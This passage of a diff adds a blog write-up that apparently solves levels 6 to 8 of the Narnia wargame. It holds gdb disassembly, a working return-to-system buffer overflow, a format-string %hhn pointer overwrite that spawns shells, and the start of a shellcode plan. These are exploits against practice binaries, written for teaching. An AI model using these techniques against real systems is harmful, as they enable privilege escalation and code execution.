+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia6@melinda:/narnia$ gdb -q --args ./narnia6 $(python -c "print '\x41'*8 + ' ' + '\x42'*8")
+</span><span class='line'>Reading symbols from /games/narnia/narnia6...(no debugging symbols found)...done.
+</span><span class='line'>(gdb) set disassembly-flavor intel
+</span><span class='line'>(gdb) disas main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x080484d4 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x080484d5 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x080484d7 &lt;+3&gt;:     push   edi
+</span><span class='line'>   0x080484d8 &lt;+4&gt;:     and    esp,0xfffffff0
+</span><span class='line'>   0x080484db &lt;+7&gt;:     sub    esp,0x40
+</span><span class='line'>   0x080484de &lt;+10&gt;:    mov    DWORD PTR [esp+0x38],0x80483d0
+</span><span class='line'>   0x080484e6 &lt;+18&gt;:    cmp    DWORD PTR [ebp+0x8],0x3
+</span><span class='line'>   0x080484ea &lt;+22&gt;:    je     0x804850e &lt;main+58&gt;
+</span><span class='line'>   0x080484ec &lt;+24&gt;:    mov    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>   0x080484ef &lt;+27&gt;:    mov    edx,DWORD PTR [eax]
+</span><span class='line'>   0x080484f1 &lt;+29&gt;:    mov    eax,0x8048730
+</span><span class='line'>   0x080484f6 &lt;+34&gt;:    mov    DWORD PTR [esp+0x4],edx
+</span><span class='line'>   0x080484fa &lt;+38&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x080484fd &lt;+41&gt;:    call   0x80483b0 &lt;printf@plt&gt;
+</span><span class='line'>   0x08048502 &lt;+46&gt;:    mov    DWORD PTR [esp],0xffffffff
+</span><span class='line'>   0x08048509 &lt;+53&gt;:    call   0x80483f0 &lt;exit@plt&gt;
+</span><span class='line'>   0x0804850e &lt;+58&gt;:    mov    DWORD PTR [esp+0x3c],0x0
+</span><span class='line'>   0x08048516 &lt;+66&gt;:    jmp    0x8048571 &lt;main+157&gt;
+</span><span class='line'>   0x08048518 &lt;+68&gt;:    mov    eax,ds:0x8049940
+</span><span class='line'>   0x0804851d &lt;+73&gt;:    mov    edx,DWORD PTR [esp+0x3c]
+</span><span class='line'>   0x08048521 &lt;+77&gt;:    shl    edx,0x2
+</span><span class='line'>   0x08048524 &lt;+80&gt;:    add    eax,edx
+</span><span class='line'>   0x08048526 &lt;+82&gt;:    mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x08048528 &lt;+84&gt;:    mov    DWORD PTR [esp+0x1c],0xffffffff
+</span><span class='line'>   0x08048530 &lt;+92&gt;:    mov    edx,eax
+</span><span class='line'>   0x08048532 &lt;+94&gt;:    mov    eax,0x0
+</span><span class='line'>   0x08048537 &lt;+99&gt;:    mov    ecx,DWORD PTR [esp+0x1c]
+</span><span class='line'>   0x0804853b &lt;+103&gt;:   mov    edi,edx
+</span><span class='line'>   0x0804853d &lt;+105&gt;:   repnz scas al,BYTE PTR es:[edi]
+</span><span class='line'>   0x0804853f &lt;+107&gt;:   mov    eax,ecx
+</span><span class='line'>   0x08048541 &lt;+109&gt;:   not    eax
+</span><span class='line'>   0x08048543 &lt;+111&gt;:   lea    ecx,[eax-0x1]
+</span><span class='line'>   0x08048546 &lt;+114&gt;:   mov    eax,ds:0x8049940
+</span><span class='line'>   0x0804854b &lt;+119&gt;:   mov    edx,DWORD PTR [esp+0x3c]
+</span><span class='line'>   0x0804854f &lt;+123&gt;:   shl    edx,0x2
+</span><span class='line'>   0x08048552 &lt;+126&gt;:   add    eax,edx
+</span><span class='line'>   0x08048554 &lt;+128&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x08048556 &lt;+130&gt;:   mov    edx,ecx
+</span><span class='line'>   0x08048558 &lt;+132&gt;:   mov    DWORD PTR [esp+0x8],edx
+</span><span class='line'>   0x0804855c &lt;+136&gt;:   mov    DWORD PTR [esp+0x4],0x0
+</span><span class='line'>   0x08048564 &lt;+144&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048567 &lt;+147&gt;:   call   0x8048410 &lt;memset@plt&gt;
+</span><span class='line'>   0x0804856c &lt;+152&gt;:   add    DWORD PTR [esp+0x3c],0x1
+</span><span class='line'>   0x08048571 &lt;+157&gt;:   mov    eax,ds:0x8049940
+</span><span class='line'>   0x08048576 &lt;+162&gt;:   mov    edx,DWORD PTR [esp+0x3c]
+</span><span class='line'>   0x0804857a &lt;+166&gt;:   shl    edx,0x2
+</span><span class='line'>   0x0804857d &lt;+169&gt;:   add    eax,edx
+</span><span class='line'>   0x0804857f &lt;+171&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x08048581 &lt;+173&gt;:   test   eax,eax
+</span><span class='line'>   0x08048583 &lt;+175&gt;:   jne    0x8048518 &lt;main+68&gt;
+</span><span class='line'>   0x08048585 &lt;+177&gt;:   mov    DWORD PTR [esp+0x3c],0x3
+</span><span class='line'>   0x0804858d &lt;+185&gt;:   jmp    0x80485de &lt;main+266&gt;
+</span><span class='line'>   0x0804858f &lt;+187&gt;:   mov    eax,DWORD PTR [esp+0x3c]
+</span><span class='line'>   0x08048593 &lt;+191&gt;:   shl    eax,0x2
+</span><span class='line'>   0x08048596 &lt;+194&gt;:   add    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>   0x08048599 &lt;+197&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x0804859b &lt;+199&gt;:   mov    DWORD PTR [esp+0x1c],0xffffffff
+</span><span class='line'>   0x080485a3 &lt;+207&gt;:   mov    edx,eax
+</span><span class='line'>   0x080485a5 &lt;+209&gt;:   mov    eax,0x0
+</span><span class='line'>   0x080485aa &lt;+214&gt;:   mov    ecx,DWORD PTR [esp+0x1c]
+</span><span class='line'>   0x080485ae &lt;+218&gt;:   mov    edi,edx
+</span><span class='line'>   ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+</span><span class='line'>   0x080485b0 &lt;+220&gt;:   repnz scas al,BYTE PTR es:[edi]
+</span><span class='line'>   0x080485b2 &lt;+222&gt;:   mov    eax,ecx
+</span><span class='line'>   0x080485b4 &lt;+224&gt;:   not    eax
+</span><span class='line'>   0x080485b6 &lt;+226&gt;:   lea    edx,[eax-0x1]
+</span><span class='line'>   0x080485b9 &lt;+229&gt;:   mov    eax,DWORD PTR [esp+0x3c]
+</span><span class='line'>   0x080485bd &lt;+233&gt;:   shl    eax,0x2
+</span><span class='line'>   0x080485c0 &lt;+236&gt;:   add    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>   0x080485c3 &lt;+239&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x080485c5 &lt;+241&gt;:   mov    DWORD PTR [esp+0x8],edx
+</span><span class='line'>   0x080485c9 &lt;+245&gt;:   mov    DWORD PTR [esp+0x4],0x0
+</span><span class='line'>   0x080485d1 &lt;+253&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x080485d4 &lt;+256&gt;:   call   0x8048410 &lt;memset@plt&gt;
+</span><span class='line'>   0x080485d9 &lt;+261&gt;:   add    DWORD PTR [esp+0x3c],0x1
+</span><span class='line'>   0x080485de &lt;+266&gt;:   mov    eax,DWORD PTR [esp+0x3c]
+</span><span class='line'>   0x080485e2 &lt;+270&gt;:   shl    eax,0x2
+</span><span class='line'>   0x080485e5 &lt;+273&gt;:   add    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>   0x080485e8 &lt;+276&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x080485ea &lt;+278&gt;:   test   eax,eax
+</span><span class='line'>   0x080485ec &lt;+280&gt;:   jne    0x804858f &lt;main+187&gt;
+</span><span class='line'>   0x080485ee &lt;+282&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>   0x080485f1 &lt;+285&gt;:   add    eax,0x4
+</span><span class='line'>   0x080485f4 &lt;+288&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x080485f6 &lt;+290&gt;:   mov    DWORD PTR [esp+0x4],eax
+</span><span class='line'>   0x080485fa &lt;+294&gt;:   lea    eax,[esp+0x30]
+</span><span class='line'>   0x080485fe &lt;+298&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048601 &lt;+301&gt;:   call   0x80483c0 &lt;strcpy@plt&gt;
+</span><span class='line'>   0x08048606 &lt;+306&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+</span><span class='line'>   0x08048609 &lt;+309&gt;:   add    eax,0x8
+</span><span class='line'>   0x0804860c &lt;+312&gt;:   mov    eax,DWORD PTR [eax]
+</span><span class='line'>   0x0804860e &lt;+314&gt;:   mov    DWORD PTR [esp+0x4],eax
+</span><span class='line'>   0x08048612 &lt;+318&gt;:   lea    eax,[esp+0x28]
+</span><span class='line'>   0x08048616 &lt;+322&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048619 &lt;+325&gt;:   call   0x80483c0 &lt;strcpy@plt&gt;
+</span><span class='line'>   0x0804861e &lt;+330&gt;:   mov    eax,DWORD PTR [esp+0x38]
+</span><span class='line'>   0x08048622 &lt;+334&gt;:   and    eax,0xff000000
+</span><span class='line'>   0x08048627 &lt;+339&gt;:   cmp    eax,0xff000000
+</span><span class='line'>   0x0804862c &lt;+344&gt;:   jne    0x804863a &lt;main+358&gt;
+</span><span class='line'>   0x0804862e &lt;+346&gt;:   mov    DWORD PTR [esp],0xffffffff
+</span><span class='line'>   0x08048635 &lt;+353&gt;:   call   0x80483f0 &lt;exit@plt&gt;
+</span><span class='line'>   0x0804863a &lt;+358&gt;:   lea    eax,[esp+0x30]
+</span><span class='line'>   0x0804863e &lt;+362&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x08048641 &lt;+365&gt;:   mov    eax,DWORD PTR [esp+0x38]
+</span><span class='line'>   0x08048645 &lt;+369&gt;:   call   eax
+</span><span class='line'>   0x08048647 &lt;+371&gt;:   mov    DWORD PTR [esp],0x1
+</span><span class='line'>   0x0804864e &lt;+378&gt;:   call   0x80483f0 &lt;exit@plt&gt;
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>(gdb) b *main+369
+</span><span class='line'>Breakpoint 1 at 0x8048645
+</span><span class='line'>(gdb) r
+</span><span class='line'>Starting program: /games/narnia/narnia6 AAAAAAAA BBBBBBBB
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x08048645 in main ()
+</span><span class='line'>(gdb) p system
+</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0xf7e6b250 &lt;system&gt;
+</span><span class='line'>(gdb) x/50xw $esp
+</span><span class='line'>0xffffd6c0:     0xffffd6f0      0xffffd8fd      0x00000021      0x08048399
+</span><span class='line'>0xffffd6d0:     0xf7fcf3e4      0x00008000      0x08049910      0xffffffff
+</span><span class='line'>0xffffd6e0:     0xffffffff      0xf7e5f116      0x42424242      0x42424242
+</span><span class='line'>0xffffd6f0:     0x41414100      0x41414141      0x08048300      0x00000003
+</span><span class='line'>0xffffd700:     0x08048660      0x00000000      0x00000000      0xf7e454b3
+</span><span class='line'>0xffffd710:     0x00000003      0xffffd7a4      0xffffd7b4      0xf7fd3000
+</span><span class='line'>0xffffd720:     0x00000000      0xffffd71c      0xffffd7b4      0x00000000
+</span><span class='line'>0xffffd730:     0x08048280      0xf7fceff4      0x00000000      0x00000000
+</span><span class='line'>0xffffd740:     0x00000000      0xc59967b5      0xf29fa3a5      0x00000000
+</span><span class='line'>0xffffd750:     0x00000000      0x00000000      0x00000003      0x08048420
+</span><span class='line'>0xffffd760:     0x00000000      0xf7ff0a90      0xf7e453c9      0xf7ffcff4
+</span><span class='line'>0xffffd770:     0x00000003      0x08048420      0x00000000      0x08048441
+</span><span class='line'>0xffffd780:     0x080484d4      0x00000003</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>fp</code> is stored at <code>0xffffd6f8</code> and <code>b1</code> and <code>b2</code> are directly above it on the stack.</p>
+
+<p>In x86 <code>esp</code> points to the argument list of a function just before it&rsquo;s called. In our case <code>esp</code> is pointing to <code>0xffffd6f0</code>, which is where <code>b1</code> is stored. Given that our objective is to execute <code>system("/bin/sh")</code> we would like this memory location to store <code>/bin/sh</code> (null terminated!) and <code>0xffffd6f8</code> (<code>fp</code>) to store (<code>0xf7e6b250</code>), which is the address of <code>system</code>. To achieve this we can use <code>b1</code> to overwrite <code>fp</code> and <code>b2</code> to write <code>/bin/sh</code> to the stack (a null byte will be automatically appended to it):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia6@melinda:/narnia$ ./narnia6 $(python -c "print '\x41'*8 + '\x50\xb2\xe6\xf7' + ' ' + '\x41'*8 + '/bin/sh'")
+</span><span class='line'>$ whoami
+</span><span class='line'>narnia7</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 7:</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>
+</span><span class='line'>int goodfunction();
+</span><span class='line'>int hackedfunction();
+</span><span class='line'>
+</span><span class='line'>int vuln(const char *format){
+</span><span class='line'>    char buffer[128];
+</span><span class='line'>    int (*ptrf)();
+</span><span class='line'>
+</span><span class='line'>    memset(buffer, 0, sizeof(buffer));
+</span><span class='line'>    printf("goodfunction() = %p\n", goodfunction);
+</span><span class='line'>    printf("hackedfunction() = %p\n\n", hackedfunction);
+</span><span class='line'>
+</span><span class='line'>    ptrf = goodfunction;
+</span><span class='line'>    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+</span><span class='line'>
+</span><span class='line'>    printf("I guess you want to come to the hackedfunction...\n");
+</span><span class='line'>    sleep(2);
+</span><span class='line'>    ptrf = goodfunction;
+</span><span class='line'>
+</span><span class='line'>    snprintf(buffer, sizeof buffer, format);
+</span><span class='line'>
+</span><span class='line'>    return ptrf();
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv){
+</span><span class='line'>    if (argc &lt;= 1){
+</span><span class='line'>        fprintf(stderr, "Usage: %s &lt;buffer&gt;\n", argv[0]);
+</span><span class='line'>        exit(-1);
+</span><span class='line'>    }
+</span><span class='line'>    exit(vuln(argv[1]));
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int goodfunction(){
+</span><span class='line'>    printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+</span><span class='line'>    fflush(stdout);
+</span><span class='line'>
+</span><span class='line'>    return 0;
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int hackedfunction(){
+</span><span class='line'>    printf("Way to go!!!!");
+</span><span class='line'>    fflush(stdout);
+</span><span class='line'>    system("/bin/sh");
+</span><span class='line'>
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This level is very similar to level 5. We need to use <code>snprintf</code> to change the value of <code>ptrf</code> to the address of <code>hackedfunction</code> instead of <code>goodfunction</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ./narnia7 AAAAAAA
+</span><span class='line'>goodfunction() = 0x804866f
+</span><span class='line'>hackedfunction() = 0x8048695
+</span><span class='line'>
+</span><span class='line'>before : ptrf() = 0x804866f (0xffffd69c)
+</span><span class='line'>I guess you want to come to the hackedfunction...
+</span><span class='line'>Welcome to the goodfunction, but i said the Hackedfunction..</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since the only differnce between the addresses of <code>hackedfunction</code> and <code>goodfunction</code> is in the LSB, we can replace only it instead of overwriting the entire address. As before, we use <code>ltrace</code> to get the parameter number of our format string:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ltrace -s 500 ./narnia7 AAAA%5\$x
+</span><span class='line'>__libc_start_main(0x804861d, 2, -10284, 0x80486d0, 0x8048740 &lt;unfinished ...&gt;
+</span><span class='line'>printf("goodfunction() = %p\n", 0x804866fgoodfunction() = 0x804866f
+</span><span class='line'>)                                                                                       = 27
+</span><span class='line'>printf("hackedfunction() = %p\n\n", 0x8048695hackedfunction() = 0x8048695
+</span><span class='line'>
+</span><span class='line'>)                                                                                   = 30
+</span><span class='line'>printf("before : ptrf() = %p (%p)\n", 0x804866f, 0xffffd68cbefore : ptrf() = 0x804866f (0xffffd68c)
+</span><span class='line'>)                                                                     = 41
+</span><span class='line'>puts("I guess you want to come to the hackedfunction..."I guess you want to come to the hackedfunction...
+</span><span class='line'>)                                                                        = 50
+</span><span class='line'>sleep(2)                                                                                                                         = 0
+</span><span class='line'>snprintf("AAAA804866f", 128, "AAAA%5$x", 0xf7fd32e8)                                                                             = 11
+</span><span class='line'>puts("Welcome to the goodfunction, but i said the Hackedfunction.."Welcome to the goodfunction, but i said the Hackedfunction..
+</span><span class='line'>)                                                             = 61
+</span><span class='line'>fflush(0xf7fcfa20)                                                                                                               = 0
+</span><span class='line'>exit(0 &lt;unfinished ...&gt;
+</span><span class='line'>+++ exited (status 0) +++
+</span><span class='line'>narnia7@melinda:/narnia$ ltrace -s 500 ./narnia7 AAAA%6\$x
+</span><span class='line'>__libc_start_main(0x804861d, 2, -10284, 0x80486d0, 0x8048740 &lt;unfinished ...&gt;
+</span><span class='line'>printf("goodfunction() = %p\n", 0x804866fgoodfunction() = 0x804866f
+</span><span class='line'>)                                                                                       = 27
+</span><span class='line'>printf("hackedfunction() = %p\n\n", 0x8048695hackedfunction() = 0x8048695
+</span><span class='line'>
+</span><span class='line'>)                                                                                   = 30
+</span><span class='line'>printf("before : ptrf() = %p (%p)\n", 0x804866f, 0xffffd68cbefore : ptrf() = 0x804866f (0xffffd68c)
+</span><span class='line'>)                                                                     = 41
+</span><span class='line'>puts("I guess you want to come to the hackedfunction..."I guess you want to come to the hackedfunction...
+</span><span class='line'>)                                                                        = 50
+</span><span class='line'>sleep(2)                                                                                                                         = 0
+</span><span class='line'>snprintf("AAAA41414141", 128, "AAAA%6$x", 0xf7fd32e8)                                                                            = 12
+</span><span class='line'>puts("Welcome to the goodfunction, but i said the Hackedfunction.."Welcome to the goodfunction, but i said the Hackedfunction..
+</span><span class='line'>)                                                             = 61
+</span><span class='line'>fflush(0xf7fcfa20)                                                                                                               = 0
+</span><span class='line'>exit(0 &lt;unfinished ...&gt;
+</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>which is <code>6</code>. The LSB of <code>ptrf</code> is stored at <code>0xffffd68c</code> and our goal is to change it to <code>0x95</code> (which is 149 in decimal). Four bytes are already printed because of the address we specify in the beginning of the format string, thus we need to add another 145:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>narnia7@melinda:/narnia$ ./narnia7 $(printf '\x8c\xd6\xff\xff')%145x%6\$hhn
+</span><span class='line'>goodfunction() = 0x804866f
+</span><span class='line'>hackedfunction() = 0x8048695
+</span><span class='line'>
+</span><span class='line'>before : ptrf() = 0x804866f (0xffffd68c)
+</span><span class='line'>I guess you want to come to the hackedfunction...
+</span><span class='line'>Way to go!!!!$ whoami
+</span><span class='line'>narnia8</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Notice that I used the <code>hh</code> specfier, which only writes one byte (the LSB in our case).</p>
+
+<h2>Level 8 (last):</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>// gcc's variable reordering fucked things up
+</span><span class='line'>// to keep the level in its old style i am
+</span><span class='line'>// making "i" global unti i find a fix
+</span><span class='line'>// -morla
+</span><span class='line'>int i;
+</span><span class='line'>
+</span><span class='line'>void func(char *b){
+</span><span class='line'>    char *blah=b;
+</span><span class='line'>    char bok[20];
+</span><span class='line'>    //int i=0;
+</span><span class='line'>
+</span><span class='line'>    memset(bok, '\0', sizeof(bok));
+</span><span class='line'>    for(i=0; blah[i] != '\0'; i++)
+</span><span class='line'>        bok[i]=blah[i];
+</span><span class='line'>
+</span><span class='line'>    printf("%s\n",bok);
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv){
+</span><span class='line'>
+</span><span class='line'>    if(argc &gt; 1)
+</span><span class='line'>        func(argv[1]);
+</span><span class='line'>    else
+</span><span class='line'>        printf("%s argument\n", argv[0]);
+</span><span class='line'>
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is nothing very obvious here, but notice that <code>bok</code> is just above the pointer to our string on the stack. Therefore, by carefully overflowing <code>bok</code> into <code>blah</code> we can change the base address from which bytes are read and written to <code>bok</code> (to the stack). We can use this to overwrite the return address of <code>func</code> and redirect execution to our shellcode, which we&rsquo;ll store in some environment variable.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
